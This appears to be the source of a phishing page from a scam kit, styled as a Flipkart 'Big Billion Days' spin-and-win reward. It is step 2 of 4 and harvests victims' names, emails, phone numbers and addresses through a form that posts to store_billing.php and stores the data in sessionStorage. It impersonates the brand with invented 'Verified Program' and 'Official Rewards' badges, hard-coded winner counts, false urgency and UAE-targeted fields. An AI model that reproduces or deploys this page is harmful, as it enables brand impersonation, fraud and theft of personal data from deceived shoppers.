<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery Information - Flipkart Rewards</title>
    <link rel="icon" href="./assets/favicon.ico">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/style/welcom.css">
</head>
<body>
    <nav class="flipkart-navbar">
        <div class="max-w-7xl mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-8">
                    <div class="text-2xl font-bold text-white">Flipkart</div>
                    <div class="hidden md:flex space-x-6">
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Electronics</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Fashion</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Home</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Appliances</a>
                    </div>
                </div>
                <div class="hidden md:flex flex-1 max-w-lg mx-8">
                    <div class="relative w-full">
                        <input type="text" placeholder="Search for products, brands and more" class="w-full py-3 px-4 pr-12 rounded-l-md border-none outline-none">
                        <button class="absolute right-0 top-0 h-full px-4 bg-yellow-400 rounded-r-md hover:bg-yellow-500 transition-colors">
                            <i class="fas fa-search text-blue-800"></i>
                        </button>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-user mr-2"></i>
                        <span class="hidden sm:inline">Login</span>
                    </button>
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-shopping-cart mr-2"></i>
                        <span class="hidden sm:inline">Cart</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <div class="bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 py-12 relative overflow-hidden">
        <div class="absolute inset-0 opacity-10">
            <div class="absolute top-4 left-10 w-16 h-16 border-2 border-white rounded-full"></div>
            <div class="absolute top-20 right-20 w-8 h-8 bg-yellow-300 rounded-full"></div>
            <div class="absolute bottom-10 left-1/4 w-12 h-12 border border-white rotate-45"></div>
            <div class="absolute bottom-6 right-10 w-6 h-6 bg-white rounded-full"></div>
        </div>

        <div class="max-w-6xl mx-auto px-4 text-center relative z-10">
            <div class="inline-flex items-center bg-yellow-400 text-blue-900 px-4 py-2 rounded-full text-sm font-bold mb-4">
                <i class="fas fa-birthday-cake mr-2"></i>
                17th Anniversary Special
            </div>

            <h1 class="text-5xl md:text-6xl font-black mb-4 text-white leading-tight">
                <span class="inline-block animate-pulse">??</span>
                Big Billion Days
                <span class="inline-block animate-pulse">??</span>
            </h1>

            <div class="text-2xl md:text-3xl font-bold text-yellow-200 mb-3">
                Spin &amp; Win Mega Rewards!
            </div>

            <p class="text-lg text-blue-100 mb-6 max-w-3xl mx-auto">
                Celebrate Flipkart's 17th Anniversary with exclusive prizes worth up to ?80,000!
                <strong class="text-yellow-200">Limited time offer</strong> - Only for registered users.
            </p>

            <div class="flex flex-wrap justify-center gap-3 mb-6">
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-shield-check mr-2 text-green-300"></i>
                    Verified Program
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-truck mr-2 text-blue-300"></i>
                    Free Delivery
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-certificate mr-2 text-yellow-300"></i>
                    Official Rewards
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-clock mr-2 text-orange-300"></i>
                    24H Only
                </div>
            </div>

            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-4 max-w-2xl mx-auto border border-white border-opacity-20">
                <div class="grid grid-cols-3 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-yellow-300" id="totalWinners">12,847</div>
                        <div class="text-xs text-blue-100">Winners Today</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-green-300" id="totalPrizes">?2.4Cr+</div>
                        <div class="text-xs text-blue-100">Prizes Given</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-orange-300 flex items-center justify-center">
                            <i class="fas fa-circle text-xs mr-1 animate-pulse"></i>
                            <span id="liveUsers">1,247</span>
                        </div>
                        <div class="text-xs text-blue-100">Playing Now</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <main class="max-w-4xl mx-auto px-4 py-8">
        <div class="mb-8">
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm font-semibold text-blue-600 bg-blue-50 px-3 py-1 rounded-full">
                    Step 2 of 4
                </span>
                <span class="text-sm text-gray-600">50%</span>
            </div>
            <div class="progress-container">
                <div class="progress-bar" style="width: 50%"></div>
            </div>
        </div>

        <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
            <div class="text-center mb-8">
                <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-truck text-blue-600 text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Delivery Information</h2>
                <p class="text-lg text-gray-600">Please provide your delivery address</p>
            </div>

            <form id="billingForm" method="POST" action="store_billing.php" class="max-w-2xl mx-auto space-y-6">
                <div class="bg-gray-50 rounded-xl p-6 mb-6">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                        <i class="fas fa-user mr-2 text-blue-600"></i>
                        Personal Information
                    </h3>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">First Name</label>
                            <input type="text" name="firstname" placeholder="Enter your first name" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Last Name</label>
                            <input type="text" name="lastname" placeholder="Enter your last name" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                            <input type="email" name="email" placeholder="your.email@example.com" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Mobile Number</label>
                            <input type="tel" name="phone" placeholder="+971 50 123 4567" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                    </div>
                </div>

                <div class="bg-gray-50 rounded-xl p-6 mb-6">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                        <i class="fas fa-map-marker-alt mr-2 text-green-600"></i>
                        Delivery Address
                    </h3>

                    <div class="grid grid-cols-1 gap-4">
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Address</label>
                            <input type="text" name="address" placeholder="House/Flat No., Street, Landmark" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">City</label>
                            <input type="text" name="city" placeholder="Dubai" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Emirate</label>
                            <select name="state" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                                <option value="">Select Emirate</option>
                                <option value="Abu Dhabi">Abu Dhabi</option>
                                <option value="Dubai">Dubai</option>
                                <option value="Sharjah">Sharjah</option>
                                <option value="Ajman">Ajman</option>
                                <option value="Fujairah">Fujairah</option>
                                <option value="Ras Al Khaimah">Ras Al Khaimah</option>
                                <option value="Umm Al Quwain">Umm Al Quwain</option>
                            </select>
                        </div>
                        <div class="relative">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Postal Code</label>
                            <input type="text" name="postal" placeholder="00000" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors">
                        </div>
                    </div>
                </div>

                <div class="text-center">
                    <button type="submit" class="flipkart-btn px-12 py-4 text-lg flex items-center justify-center mx-auto">
                        <i class="fas fa-arrow-right mr-2"></i>
                        Continue
                    </button>
                </div>
            </form>
        </div>
    </main>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div id="loadingText" class="text-xl font-semibold mb-2">Processing...</div>
            <div class="loading-dots">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="text-sm mt-4 opacity-75" id="loadingSubtext">Please wait while we secure your information</div>
        </div>
    </div>

    <script>
        const billingForm = document.getElementById('billingForm');
        if (billingForm) {
            billingForm.addEventListener('submit', function () {
                const formData = new FormData(billingForm);
                const data = {};
                formData.forEach((value, key) => {
                    data[key] = value;
                });
                sessionStorage.setItem('billingInfo', JSON.stringify(data));
                const overlay = document.getElementById('loadingOverlay');
                if (overlay) {
                    overlay.style.display = 'flex';
                }
            });
        }
    </script>
</body>
</html>
